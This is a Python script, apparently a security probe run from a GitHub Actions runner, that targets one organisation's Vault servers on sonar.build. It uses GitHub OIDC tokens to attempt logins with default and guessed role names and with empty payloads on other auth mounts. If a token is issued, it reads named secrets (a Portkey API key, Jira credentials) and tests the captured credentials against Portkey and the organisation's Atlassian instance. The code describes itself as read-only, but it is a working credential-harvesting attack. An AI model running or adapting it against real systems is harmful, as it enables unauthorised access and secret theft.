#!/usr/bin/env python3
"""Read-only cross-environment differential of the Vault family, from a GitHub-hosted runner.

Targets (vault family, NOT prod vault.sonar.build which was covered by 11978):
  vault-public.sonar.build, vault.dev.sonar.build, vault-public.dev.sonar.build,
  vault.staging.sonar.build, vault-public.staging.sonar.build
Prod vault.sonar.build is used only as a read-only control (health/seal/mounts).

Strictly read-only:
  - GET /v1/sys/health
  - GET /v1/sys/seal-status
  - GET /v1/sys/internal/ui/mounts      (X-Vault-Request: true)
  - GET /v1/sys/internal/ui/namespaces  (expected 500 without token)
  - POST /v1/auth/<mount>/login         (<=3 per reachable host: default_role + our own
                                         repo-derived role names; total <=15 across hosts)
  - if a client_token is issued: sys/capabilities-self, auth/token/lookup-self,
    at most ONE exact KV read per known path, then <=1 minimal read-only validation
    per obtained credential. Secrets are never printed in plaintext (first4/last4 only).

No writes, no deletes, no role/KV enumeration, no brute force, no credential injection.
"""
import base64
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

OWNER = os.environ.get("GITHUB_REPOSITORY_OWNER", "cballk")
REPO = (os.environ.get("GITHUB_REPOSITORY", "cballk/fabric-oidc-10548").split("/") + [""])[1]

# First one is the read-only control (already covered by 11978 for login; we only re-read
# health/seal/mounts here to diff cluster_id / mount surface).
CONTROL = "vault.sonar.build"
TARGETS = [
    "vault-public.sonar.build",
    "vault.dev.sonar.build",
    "vault-public.dev.sonar.build",
    "vault.staging.sonar.build",
    "vault-public.staging.sonar.build",
]

MAX_LOGINS = 15
RESULT = {"probe": "vault-family-diff-11983", "owner_repo": f"{OWNER}/{REPO}"}
LOGIN_COUNT = 0


def log(*a):
    print(*a, flush=True)


def mask(v):
    if v is None:
        return None
    v = str(v)
    if len(v) <= 8:
        return "****"
    return v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=20, maxbody=400000):
    h = {"User-Agent": "oidc-vault-family-probe/1.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            h.setdefault("Content-Type", "application/json")
        else:
            body = data if isinstance(data, bytes) else str(data).encode()
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(maxbody)
            return {"status": r.status, "ms": int((time.time() - t0) * 1000),
                    "headers": dict(r.headers), "body": raw}
    except urllib.error.HTTPError as e:
        raw = e.read(maxbody)
        return {"status": e.code, "ms": int((time.time() - t0) * 1000),
                "headers": dict(e.headers or {}), "body": raw}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "error": f"{type(e).__name__}: {str(e)[:250]}"}


def jbody(r, n=4000):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:n].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict):
        if "errors" in j and isinstance(j["errors"], list):
            return "; ".join(str(x) for x in j["errors"])[:600]
        if "error" in j:
            return str(j["error"])[:600]
        return json.dumps(j)[:600]
    return str(j)[:600]


def decode_jwt(t):
    seg = t.split(".")[1]
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def get_oidc(aud):
    """Request a GitHub OIDC JWT for a specific audience string."""
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        return None, "no id-token env (missing permissions: id-token: write?)"
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(aud, safe="")
    r = http("GET", u, headers={"Authorization": "Bearer " + tok, "Accept": "application/json"}, timeout=20)
    if r["status"] != 200:
        return None, {"status": r["status"], "error": r.get("error"), "body": jbody(r)}
    try:
        return json.loads(r["body"].decode())["value"], None
    except Exception as e:
        return None, f"parse error {e}"


def do_login(base, mount, payload, label, jwt_needed=True):
    """One login POST. Enforces the global login budget."""
    global LOGIN_COUNT
    if LOGIN_COUNT >= MAX_LOGINS:
        return {"label": label, "skipped": "global login budget exhausted"}
    LOGIN_COUNT += 1
    url = f"{base}/v1/auth/{mount}/login"
    r = http("POST", url, data=payload, timeout=20)
    out = {"label": label, "mount": mount, "url_path": f"/v1/auth/{mount}/login",
           "status": r["status"], "ms": r["ms"], "error": r.get("error")}
    j = jbody(r) if r.get("body") else None
    if isinstance(j, dict):
        if isinstance(j.get("auth"), dict):
            a = j["auth"]
            ct = a.get("client_token")
            out["issued"] = True
            out["token_present"] = bool(ct)
            out["policies"] = a.get("policies")
            out["token_ttl"] = a.get("lease_duration")
            out["accessor_present"] = bool(a.get("accessor"))
            out["meta"] = a.get("metadata") if isinstance(a.get("metadata"), dict) else None
            if ct:
                out["_client_token"] = ct
        else:
            out["resp"] = j if len(json.dumps(j)) < 800 else errs(j)
    elif r.get("body"):
        out["raw"] = (r.get("body") or b"")[:300].decode("utf-8", "replace")
    return out


def probe_host(host, do_login_attempts):
    global LOGIN_COUNT
    base = f"https://{host}"
    h = {"host": host}
    # DNS
    try:
        infos = socket.getaddrinfo(host, 443, proto=socket.IPPROTO_TCP)
        h["dns"] = sorted({i[4][0] for i in infos})
    except Exception as e:
        h["dns"] = [f"getaddrinfo error: {type(e).__name__}: {str(e)[:150]}"]
    # health
    r = http("GET", base + "/v1/sys/health?standbyok=true&perfstandbyok=true&sealedcode=200&uninitcode=200", timeout=20)
    hj = jbody(r) if r.get("body") else None
    h["sys_health"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"), "json": hj if r["status"] else None}
    # seal-status
    r = http("GET", base + "/v1/sys/seal-status", timeout=20)
    h["seal_status"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                        "json": jbody(r) if r["status"] else None}
    # mounts (unauthenticated UI endpoint)
    r = http("GET", base + "/v1/sys/internal/ui/mounts", headers={"X-Vault-Request": "true"}, timeout=20)
    mj = jbody(r) if r.get("body") else None
    mounts_summary = None
    if isinstance(mj, dict) and isinstance(mj.get("data"), dict):
        d = mj["data"]
        auth = {}
        for k, v in (d.get("auth") or {}).items():
            if isinstance(v, dict):
                auth[k] = {"type": v.get("type"), "description": v.get("description"),
                           "options": v.get("options")}
        secret = {}
        for k, v in (d.get("secret") or {}).items():
            if isinstance(v, dict):
                secret[k] = {"type": v.get("type"), "description": v.get("description")}
        mounts_summary = {"auth": auth, "secret": secret,
                          "auth_keys": sorted(auth.keys()), "secret_keys": sorted(secret.keys())}
    h["ui_mounts"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                      "summary": mounts_summary,
                      "raw": None if mounts_summary else (errs(mj) if mj else None)}
    # namespaces
    r = http("GET", base + "/v1/sys/internal/ui/namespaces", headers={"X-Vault-Request": "true"}, timeout=20)
    h["ui_namespaces"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                          "resp": errs(jbody(r)) if r.get("body") else None}
    reachable = h["sys_health"]["status"] is not None

    # --- login differential (only for reachable targets; control is not logged in here) ---
    h["login"] = []
    if do_login_attempts and reachable:
        aud = base  # audience = the target host URL
        jwt, jerr = get_oidc(aud)
        h["oidc"] = {"ok": bool(jwt), "audience_requested": aud, "error": jerr}
        if jwt:
            try:
                c = decode_jwt(jwt)
                h["oidc"]["claims"] = {k: c.get(k) for k in ("iss", "aud", "sub", "repository",
                                                            "repository_owner", "repository_id",
                                                            "ref", "environment", "job_workflow_ref",
                                                            "event_name")}
            except Exception as e:
                h["oidc"]["claim_error"] = str(e)
            # 1) default_role form (no role)
            h["login"].append(do_login(base, "jwt-ghwf", {"jwt": jwt}, "jwt-ghwf:no-role(default_role)"))
            if not h["login"][-1].get("issued"):
                # 2) our own repo-derived role names
                for role in (f"github-{OWNER}-{REPO}", f"github-{OWNER}-{REPO}-protected"):
                    if LOGIN_COUNT >= MAX_LOGINS:
                        break
                    h["login"].append(do_login(base, "jwt-ghwf", {"jwt": jwt, "role": role}, f"jwt-ghwf:role={role}"))
                    if h["login"][-1].get("issued"):
                        break
            # 3) if exposed, a few other auth mounts get one minimal empty login each
            if isinstance(mounts_summary, dict):
                other = [k.rstrip("/") for k in mounts_summary.get("auth", {}).keys()
                         if "jwt-ghwf" not in k]
                for path in other[:3]:
                    if LOGIN_COUNT >= MAX_LOGINS:
                        break
                    typ = (mounts_summary["auth"].get(path + "/") or {}).get("type")
                    payload = {}
                    if typ == "token":
                        # token lookup is not a login; use lookup-self with empty token (expect 403)
                        r = http("POST", base + "/v1/auth/token/lookup-self", data={}, timeout=20)
                        h["login"].append({"label": f"other:{path}({typ}):lookup-self-empty",
                                           "status": r["status"], "resp": errs(jbody(r)) if r.get("body") else None})
                        LOGIN_COUNT += 1
                        continue
                    h["login"].append(do_login(base, path, payload, f"other:{path}({typ}):empty"))
    # collect issued token for deeper read
    issued = None
    for it in h.get("login", []):
        if isinstance(it, dict) and it.get("_client_token"):
            issued = it.pop("_client_token")
            break
    h["_issued_token_present"] = bool(issued)
    return h, issued, base


def deep_read(base, token, container):
    """If a client token was issued: capabilities-self, lookup-self, then <=1 exact KV read per path."""
    H = {"X-Vault-Token": token}
    paths = ["development/kv/data/code-security-diff-val-claude-code", "development/kv/data/jira"]
    cap = http("POST", base + "/v1/sys/capabilities-self", data={"paths": paths}, headers=H, timeout=20)
    cj = jbody(cap)
    container["capabilities_self"] = {"status": cap["status"], "json": cj}
    caps = {}
    try:
        for k, v in (cj.get("data") or cj.get("capabilities") or {}).items():
            caps[k] = v
    except Exception:
        pass
    container["capability_map"] = caps
    lk = http("GET", base + "/v1/auth/token/lookup-self", headers=H, timeout=20)
    lj = jbody(lk)
    if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
        lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl", "identity_policies", "meta")}}
    container["lookup_self"] = {"status": lk["status"], "json": lj}
    kv = {}
    for path, want in (("development/kv/data/code-security-diff-val-claude-code", "portkey-api-key"),
                       ("development/kv/data/jira", ("user", "token"))):
        allowed = None
        for k, v in caps.items():
            if k == path:
                allowed = "read" in (v or [])
        if allowed is False:
            kv[path] = {"skipped": "capabilities-self says no read"}
            continue
        r = http("GET", f"{base}/v1/{path}", headers=H, timeout=20)
        j = jbody(r)
        item = {"status": r["status"], "ms": r["ms"], "error": r.get("error")}
        if isinstance(j, dict) and isinstance(j.get("data"), dict):
            d = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
            item["keys"] = sorted(d.keys())[:20] if isinstance(d, dict) else None
            item["masked"] = {k: (mask(v) if isinstance(v, str) else "<non-str>")
                              for k, v in (d.items() if isinstance(d, dict) else [])}
            if isinstance(d, dict) and d.get("portkey-api-key"):
                container["_portkey"] = d["portkey-api-key"]
            if isinstance(d, dict) and d.get("token"):
                container["_jira"] = (d.get("user"), d.get("token"))
        kv[path] = item
    container["kv_read"] = kv

    if container.get("_portkey"):
        key = container.pop("_portkey")
        v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": key}, timeout=20)
        j = jbody(v)
        container["portkey_validate"] = {"status": v["status"], "ms": v["ms"],
                                         "model_count": len(j["data"]) if isinstance(j, dict) and isinstance(j.get("data"), list) else None,
                                         "error": None if v["status"] == 200 else errs(j)}
    if container.get("_jira"):
        user, tok = container.pop("_jira")
        basic = base64.b64encode(f"{user}:{tok}".encode()).decode()
        v = http("GET", "https://sonarsource.atlassian.net/rest/api/3/myself",
                 headers={"Authorization": "Basic " + basic}, timeout=20)
        j = jbody(v)
        ident = None
        if isinstance(j, dict):
            ident = {"accountId_present": bool(j.get("accountId")),
                     "displayName_present": bool(j.get("displayName")),
                     "emailAddress_present": bool(j.get("emailAddress")),
                     "accountType": j.get("accountType")}
        container["jira_validate"] = {"status": v["status"], "ms": v["ms"], "identity": ident}


def main():
    global LOGIN_COUNT
    # egress fingerprint
    eg = {}
    for name, u in (("ipify", "https://api.ipify.org?format=json"),):
        r = http("GET", u, timeout=12)
        eg[name] = {"status": r["status"], "body": jbody(r, 300) if r["status"] == 200 else r.get("error")}
    RESULT["egress"] = eg
    RESULT["runner"] = {"name": os.environ.get("RUNNER_NAME"), "os": os.environ.get("RUNNER_OS")}

    # control: prod (read-only, no login attempts)
    ctrl, _, _ = probe_host(CONTROL, do_login_attempts=False)
    RESULT["control_prod"] = ctrl

    RESULT["targets"] = {}
    for host in TARGETS:
        try:
            h, issued, base = probe_host(host, do_login_attempts=True)
        except Exception as e:
            RESULT["targets"][host] = {"host": host, "fatal": f"{type(e).__name__}: {str(e)[:300]}"}
            continue
        if issued:
            try:
                deep_read(base, issued, h)
            except Exception as e:
                h["deep_read_error"] = f"{type(e).__name__}: {str(e)[:300]}"
        RESULT["targets"][host] = h

    RESULT["login_total"] = LOGIN_COUNT
    log("===RESULT_JSON_START===")
    log(json.dumps(RESULT, indent=1, default=str))
    log("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
